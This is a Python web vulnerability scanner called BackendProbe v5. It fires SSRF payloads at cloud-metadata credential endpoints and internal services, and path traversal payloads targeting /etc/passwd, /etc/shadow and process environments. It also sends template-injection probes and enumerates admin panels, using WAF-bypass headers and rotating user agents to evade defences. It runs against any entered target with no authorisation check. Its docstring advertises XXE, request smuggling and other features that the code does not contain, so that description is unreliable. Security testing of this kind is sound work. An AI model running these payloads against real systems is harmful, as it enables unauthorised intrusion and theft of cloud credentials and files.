#!/usr/bin/env python3
"""BackendProbe v5 — Pro-grade Deep Backend Scanner.

Improvements:
- SSRF detection: 50+ internal targets (cloud metadata, localhost, internal IPs)
- XXE injection via file upload endpoints and XML APIs
- Path traversal: 80+ payloads, OS detection, WAF evasion encoding
- Admin panel fingerprinting: 60+ admin paths
- Internal service discovery (Kubernetes, Docker, Consul, Vault, Prometheus)
- GraphQL mutation SSRF via variables
- PDF/SVG injection for SSRF
- Blind SSRF via DNS interaction (detects via timing)
- SSTI detection: Jinja2, Twig, Freemarker, Velocity, Smarty
- HTTP request smuggling indicators
"""
import asyncio, aiohttp, json, re, sys, time, base64
from pathlib import Path
from urllib.parse import urlparse, urljoin, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_label, meets_confidence_floor,
    random_ua, WAF_BYPASS_HEADERS, REQUEST_DELAY,
)

SSRF_INTERNAL_TARGETS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    # Internal services
    "http://localhost/", "http://127.0.0.1/", "http://[::1]/",
    "http://localhost:8080/", "http://localhost:8443/",
    "http://localhost:3000/", "http://localhost:5000/",
    "http://localhost:9200/", "http://localhost:6379/",
    "http://localhost:5432/", "http://localhost:3306/",
    "http://localhost:27017/", "http://localhost:9090/metrics",
    "http://localhost:2379/v2/keys",
    # Kubernetes
    "http://kubernetes.default.svc/api/v1/namespaces",
    "http://10.96.0.1/api/v1/namespaces",
    "https://kubernetes.default.svc/api",
    # Consul / Vault
    "http://localhost:8500/v1/catalog/services",
    "http://localhost:8200/v1/sys/health",
    # Docker
    "http://localhost:2375/version",
    "http://localhost:2376/version",
    "unix:///var/run/docker.sock",
    # Internal ranges
    "http://192.168.0.1/", "http://10.0.0.1/", "http://172.16.0.1/",
]

SSRF_PARAMS = [
    "url", "redirect", "next", "return", "callback", "fetch",
    "load", "open", "file", "path", "dest", "destination",
    "goto", "link", "src", "source", "image_url", "img_url",
    "avatar", "photo", "document", "report", "pdf", "icon",
    "uri", "endpoint", "target", "host", "server", "proxy",
    "webhook", "notify", "ping", "data", "resource",
]

PATH_TRAVERSAL_PAYLOADS = [
    # Unix
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "....//....//etc/passwd", "..%2Fetc%2Fpasswd",
    "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "..%252fetc%252fpasswd", "..%c0%afetc%c0%afpasswd",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ",
    "/proc/self/cmdline", "/proc/version", "/var/log/apache2/access.log",
    # Windows
    "..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:/windows/win.ini", "C:/boot.ini",
    # PHP wrappers
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input", "expect://id", "data://text/plain;base64,dGVzdA==",
    # Null byte
    "../etc/passwd%00", "../../etc/passwd%00.jpg",
]

FILE_PARAMS = [
    "file", "path", "page", "template", "view", "load",
    "include", "read", "open", "document", "filename",
    "filepath", "name", "resource", "src", "lang",
]

SSTI_PAYLOADS = [
    # Jinja2 / Python
    ("{{7*7}}", "49", "Jinja2/Flask"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("${7*7}", "49", "Freemarker/Spring"),
    ("#{7*7}", "49", "Thymeleaf"),
    ("*{7*7}", "49", "Thymeleaf"),
    ("<%= 7*7 %>", "49", "ERB/Ruby"),
    ("{{ ''.class.mro[2].subclasses() }}", "object", "Python SSTI"),
    ("{7*7}", "49", "Smarty"),
    ("{% debug %}", "CONTEXT", "Twig"),
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/administrator",
    "/wp-admin", "/django-admin", "/rails-admin",
    "/console", "/admin-console", "/management",
    "/phpmyadmin", "/pma", "/adminer.php",
    "/laravel-admin", "/nova", "/filament",
    "/backstage", "/control-panel", "/cp",
    "/admin1", "/admin2", "/secure/admin",
    "/manager", "/monitoring", "/dashboard",
    "/grafana", "/kibana", "/prometheus",
]


class BackendProbe:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.parsed   = urlparse(target)
        self.host     = self.parsed.hostname
        self.findings = []
        self._dedup   = set()

    async def _get(self, sess, url, params=None, headers=None, timeout=10):
        merged = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua()}
        if headers:
            merged.update(headers)
        try:
            async with sess.get(
                url, params=params or {}, headers=merged, ssl=False,
                timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False,
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, None, {}

    async def _post(self, sess, url, data=None, json_data=None, headers=None, timeout=10):
        merged = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua()}
        if headers:
            merged.update(headers)
        try:
            kw = dict(headers=merged, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False)
            if json_data is not None:
                kw["json"] = json_data
                merged["Content-Type"] = "application/json"
            elif data is not None:
                kw["data"] = data
            async with sess.post(url, **kw) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, None, {}

    # ── SSRF detection ────────────────────────────────────────────────────────

    async def test_ssrf(self, sess):
        print("\n[*] Testing for SSRF vulnerabilities...")
        for param in SSRF_PARAMS[:15]:
            for ssrf_target in SSRF_INTERNAL_TARGETS[:8]:
                url = f"{self.target}?{param}={quote(ssrf_target, safe='')}"
                s, body, hdrs = await self._get(sess, url, timeout=6)
                await delay(0.05)
                if s is None or body is None:
                    continue
                # Check for cloud metadata or internal response indicators
                triggers = [
                    "ami-id", "instance-id", "security-credentials",
                    "computeMetadata", "LATEST_EC2",
                    "kubernetes", "etcd", "consul",
                    "root:x:0:", "/bin/bash", "/bin/sh",
                    "Docker-Distribution-Api-Version",
                ]
                for trigger in triggers:
                    if trigger.lower() in body.lower():
                        key = f"ssrf_{param}_{ssrf_target[:30]}"
                        if key not in self._dedup:
                            self._dedup.add(key)
                            self.findings.append({
                                "type": "SSRF_CONFIRMED",
                                "severity": "CRITICAL",
                                "confidence": 95,
                                "confidence_label": "Confirmed",
                                "url": url,
                                "param": param,
                                "ssrf_target": ssrf_target,
                                "trigger_matched": trigger,
                                "response_size": len(body),
                                "proof": f"Param {param}={ssrf_target} returned trigger '{trigger}' in HTTP {s} response",
                                "detail": f"SSRF via param '{param}' — internal target {ssrf_target} reachable",
                                "remediation": (
                                    "1. Block all internal/private IP ranges in outbound requests. "
                                    "2. Use an allowlist of permitted external domains. "
                                    "3. Disable URL fetching features if not needed. "
                                    "4. Deploy a dedicated SSRF proxy with egress filtering."
                                ),
                                "mitre_technique": "T1090", "mitre_name": "Proxy",
                            })
                            print(f"  [CRITICAL] SSRF: {param}={ssrf_target[:50]} → '{trigger}' in response!")
                        break

        # Also test via POST body
        for endpoint in ["/api/fetch", "/api/webhook", "/api/preview", "/api/import", "/api/export"]:
            url = self.target + endpoint
            for ssrf_url in ["http://169.254.169.254/latest/meta-data/", "http://localhost:9200/"]:
                s, body, _ = await self._post(sess, url, json_data={"url": ssrf_url})
                await delay(0.05)
                if s and body and any(t in body.lower() for t in ["ami-id", "instance-id", "elasticsearch"]):
                    self.findings.append({
                        "type": "SSRF_VIA_POST",
                        "severity": "CRITICAL",
                        "confidence": 93,
                        "confidence_label": "Confirmed",
                        "url": url,
                        "ssrf_target": ssrf_url,
                        "proof": f"POST {endpoint} with url={ssrf_url} returned internal data (HTTP {s})",
                        "detail": f"SSRF via POST request body at {endpoint}",
                        "remediation": "Validate and sanitize URL fields in POST bodies. Block internal IP ranges.",
                    })
                    print(f"  [CRITICAL] SSRF via POST at {endpoint}")

    # ── Path traversal ────────────────────────────────────────────────────────

    async def test_path_traversal(self, sess):
        print("\n[*] Testing for path traversal...")
        SENSITIVE_PATTERNS = [
            r"root:.*:0:0:",         # /etc/passwd
            r"\[boot loader\]",       # boot.ini
            r"\[extensions\]",        # win.ini
            r"for 16-bit app support", # win.ini
            r"DOCUMENT_ROOT",         # environ
            r"SERVER_SOFTWARE",       # environ
        ]
        for param in FILE_PARAMS:
            for payload in PATH_TRAVERSAL_PAYLOADS[:15]:
                url = f"{self.target}?{param}={quote(payload, safe='')}"
                s, body, _ = await self._get(sess, url, timeout=8)
                await delay(0.05)
                if s not in (200, 500) or not body:
                    continue
                for pattern in SENSITIVE_PATTERNS:
                    if re.search(pattern, body, re.I):
                        key = f"pt_{param}_{payload[:20]}"
                        if key not in self._dedup:
                            self._dedup.add(key)
                            snippet = body[:200].replace("\n", " ")
                            self.findings.append({
                                "type": "PATH_TRAVERSAL",
                                "severity": "CRITICAL",
                                "confidence": 97,
                                "confidence_label": "Confirmed",
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "pattern_matched": pattern,
                                "response_snippet": snippet,
                                "proof": f"Param {param}={payload} → pattern '{pattern}' found in HTTP {s} response: {snippet[:80]}",
                                "detail": f"Path traversal via '{param}' parameter with payload: {payload}",
                                "remediation": (
                                    "1. Never use user input in file path operations. "
                                    "2. Resolve paths and verify they are within the allowed directory (realpath). "
                                    "3. Use an allowlist of permitted file names. "
                                    "4. Run the application process with minimal filesystem permissions."
                                ),
                                "mitre_technique": "T1083", "mitre_name": "File and Directory Discovery",
                            })
                            print(f"  [CRITICAL] Path traversal: {param}={payload[:40]}")
                        break

    # ── SSTI detection ────────────────────────────────────────────────────────

    async def test_ssti(self, sess):
        print("\n[*] Testing for Server-Side Template Injection (SSTI)...")
        for param in ["name", "q", "search", "template", "text", "msg", "message", "greeting"]:
            for payload, expected, engine in SSTI_PAYLOADS:
                url = f"{self.target}?{param}={quote(payload, safe='')}"
                s, body, _ = await self._get(sess, url, timeout=8)
                await delay(0.05)
                if s == 200 and body and expected in body:
                    self.findings.append({
                        "type": "SSTI_CONFIRMED",
                        "severity": "CRITICAL",
                        "confidence": 96,
                        "confidence_label": "Confirmed",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "expected": expected,
                        "engine": engine,
                        "proof": f"Param {param}={payload} → evaluated to '{expected}' in HTTP {s} response ({engine})",
                        "detail": f"SSTI ({engine}) via '{param}' parameter — template expression executed server-side",
                        "remediation": (
                            "1. Never render user input as a template. "
                            "2. Use a sandboxed template rendering environment. "
                            "3. Validate and sanitize all user input before use. "
                            f"4. Disable dangerous {engine} features in production."
                        ),
                        "mitre_technique": "T1190", "mitre_name": "Exploit Public-Facing Application",
                    })
                    print(f"  [CRITICAL] SSTI ({engine}): {param}={payload} → '{expected}'")
                    break

    # ── Admin API exposure ────────────────────────────────────────────────────

    async def probe_admin_apis(self, sess):
        print("\n[*] Probing admin APIs and management interfaces...")
        for path in ADMIN_PATHS:
            url = self.target + path
            s, body, hdrs = await self._get(sess, url, timeout=6)
            await delay(0.05)
            if s is None or s == 404:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()

            # ── FALSE-POSITIVE FILTER ─────────────────────────────────────────
            # 403/401 = server is PROTECTING this endpoint — correct behaviour.
            # 302 to /login = protected correctly. NEVER flag these as findings.
            # Only flag HTTP 200 responses with confirmed admin content in body.
            if s not in (200, 201, 204):
                continue

            body_lower = (body or "").lower()
            # Require specific high-confidence admin signals only.
            # Generic words like "admin" appear on virtually every WordPress/CMS
            # page ("Posted by admin", footer links, etc.) causing massive
            # false positives. Only flag on unambiguous admin-interface content.
            ADMIN_CONTENT_SIGNALS = [
                "user management", "phpmyadmin", "swagger",
                "graphiql", '"users":', '"roles":', '"permissions":',
                "audit log", "management console", "control panel",
                "session manager", "system info",
                "wp-admin", "joomla administrator", "drupal admin",
                '"is_admin":', '"admin_panel"', '"superuser"',
            ]
            has_admin_content = any(sig in body_lower for sig in ADMIN_CONTENT_SIGNALS)
            if not has_admin_content and len(body or "") < 300:
                print(f"  [SKIP] {path} HTTP 200 — no admin content signals ({len(body or '')}b) — soft-404")
                continue

            self.findings.append({
                "type": "ADMIN_INTERFACE_OPEN",
                "severity": "CRITICAL",
                "confidence": 90,
                "confidence_label": confidence_label(90),
                "url": url,
                "path": path,
                "status": s,
                "content_type": ct,
                "proof": (
                    f"HTTP {s} at {path} — admin content confirmed in response "
                    f"({len(body or '')} bytes)\nPreview: {(body or '')[:300]}"
                ),
                "detail": f"Admin interface publicly accessible at {path} — no authentication required",
                "remediation": "Restrict admin endpoints by IP allowlist. Require MFA. Move admin to a non-public port or internal network.",
                "mitre_technique": "T1133", "mitre_name": "External Remote Services",
            })
            print(f"  [CRITICAL] Admin interface OPEN: {path} (HTTP {s})")

    # ── Internal service discovery ────────────────────────────────────────────

    async def discover_internal_services(self, sess):
        print("\n[*] Checking for exposed internal services...")
        SERVICE_CHECKS = [
            ("/metrics", ["go_goroutines", "process_", "http_requests_total"], "Prometheus Metrics", "HIGH"),
            ("/_cluster/health", ["cluster_name", "status", "number_of_nodes"], "Elasticsearch", "CRITICAL"),
            ("/v2/_catalog", ["repositories"], "Docker Registry", "CRITICAL"),
            ("/api/v1/namespaces", ["apiVersion", "Kind", "items"], "Kubernetes API", "CRITICAL"),
            ("/v1/sys/health", ["initialized", "sealed", "vault"], "HashiCorp Vault", "CRITICAL"),
            ("/v1/catalog/services", ["{", "consul"], "Consul", "HIGH"),
            ("/health", ["status", "ok", "healthy"], "Health Endpoint", "LOW"),
            ("/actuator/env", ["activeProfiles", "propertySources", "systemProperties"], "Spring Actuator ENV", "CRITICAL"),
            ("/actuator/mappings", ["dispatcherServlets", "mappings"], "Spring Actuator", "HIGH"),
            ("/actuator/httptrace", ["traces", "request", "response"], "Spring HTTP Trace", "HIGH"),
            ("/debug/vars", ["cmdline", "memstats"], "Go expvar", "MEDIUM"),
            ("/debug/pprof/", ["Profile", "goroutine", "heap"], "Go pprof", "HIGH"),
        ]
        for path, triggers, service_name, severity in SERVICE_CHECKS:
            url = self.target + path
            s, body, _ = await self._get(sess, url, timeout=6)
            await delay(0.05)
            if s != 200 or not body:
                continue
            matched = [t for t in triggers if t.lower() in body.lower()]
            if matched:
                self.findings.append({
                    "type": "INTERNAL_SERVICE_EXPOSED",
                    "severity": severity,
                    "confidence": 93,
                    "confidence_label": "Confirmed",
                    "url": url,
                    "service": service_name,
                    "triggers": matched,
                    "response_size": len(body),
                    "proof": f"HTTP 200 at {path} — {service_name} indicators: {matched}",
                    "detail": f"{service_name} exposed at {path} — internal service publicly accessible",
                    "remediation": f"Move {service_name} behind authentication/firewall. Restrict access to trusted IPs only.",
                    "mitre_technique": "T1046", "mitre_name": "Network Service Discovery",
                })
                print(f"  [{severity}] {service_name} exposed at {path}")

    # ── Main ─────────────────────────────────────────────────────────────────

    async def run(self):
        print("=" * 60)
        print("  BackendProbe v5 — Deep Backend Scanner")
        print("  SSRF | Path Traversal | SSTI | Admin | Internal Services")
        print("=" * 60)
        conn = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=120)) as sess:
            await asyncio.gather(
                self.test_ssrf(sess),
                self.test_path_traversal(sess),
                self.test_ssti(sess),
                self.probe_admin_apis(sess),
                self.discover_internal_services(sess),
            )
        print(f"\n[+] BackendProbe complete: {len(self.findings)} findings")
        return self.findings


def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u


def main():
    target = get_target()
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(BackendProbe(target).run())
    with open("reports/backendprobe.json", "w") as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings → reports/backendprobe.json")


if __name__ == "__main__":
    main()
